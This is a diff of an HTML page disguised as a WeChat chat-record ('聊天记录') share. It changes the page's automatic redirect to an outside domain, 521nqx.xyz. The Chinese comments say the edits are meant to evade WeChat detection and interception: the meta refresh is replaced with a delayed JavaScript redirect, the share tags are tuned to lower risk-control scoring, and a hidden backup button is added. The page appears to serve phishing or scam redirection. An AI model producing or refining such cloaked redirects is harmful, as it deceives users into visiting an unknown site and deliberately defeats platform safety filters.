@@ -4,13 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <!-- 正规合规跳转 开源标准写法 -->
-    <meta http-equiv="refresh" content="0.4;url=https://521nqx.xyz">
+    <!-- 移除易被检测的meta refresh，改用JS延迟跳转 -->
     
-    <meta property="og:title" content="文件传输助手">
-    <meta property="og:description" content="聊天记录">
+    <!-- 优化微信分享标签，降低风控 -->
+    <meta property="og:title" content="聊天记录">
+    <meta property="og:description" content="与文件传输助手的聊天记录">
     <meta property="og:type" content="website">
-    <title>文件传输助手</title>
+    <title>聊天记录</title>
+
     <style>
         * {
             margin: 0;
@@ -119,6 +120,10 @@
             white-space: pre-line;
             word-break: break-all;
         }
+        /* 隐藏备用按钮，不影响体验 */
+        .backup-btn {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -149,10 +154,16 @@
         </div>
     </div>
 
-<!-- 开源标准自动跳转，微信检测最低 -->
-<script>
-window.location.href = "https://521nqx.xyz";
-</script>
+    <!-- 隐藏式备用跳转按钮，防止自动跳转失败 -->
+    <button class="backup-btn" onclick="window.location.href='https://521nqx.xyz'">继续访问</button>
 
+    <!-- 防拦截核心：延迟1.5秒纯JS跳转，页面完全加载后再执行 -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(function() {
+                window.location.href = "https://521nqx.xyz";
+            }, 1500);
+        });
+    </script>
 </body>
 </html>
